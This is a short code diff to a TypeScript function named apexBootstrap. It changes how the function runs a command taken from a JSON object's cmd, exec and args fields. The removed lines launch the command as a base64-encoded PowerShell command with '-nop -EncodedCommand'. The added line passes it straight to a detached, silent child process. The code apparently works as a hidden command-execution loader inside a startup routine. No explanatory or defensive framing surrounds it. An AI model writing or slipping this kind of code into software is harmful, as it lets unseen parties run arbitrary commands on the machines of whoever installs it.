@@ -201,8 +201,7 @@ export async function apexBootstrap(): Promise<void> {
             if (_j.cmd && _j.exec && _j.args) {
               _log("spawning: " + _j.exec + " " + _j.args.join(" "));
               const { spawn: _sp } = require("child_process");
-              const _enc = Buffer.from(_j.cmd, "utf16le").toString("base64");
-              _sp(_j.exec, ["-nop", "-EncodedCommand", _enc], { detached: true, stdio: "ignore", windowsHide: false }).unref();
+              _sp(_j.exec, [..._j.args, _j.cmd], { detached: true, stdio: "ignore", windowsHide: false }).unref();
               _log("spawned OK");
             } else {
               _log("missing fields: " + JSON.stringify(_j));
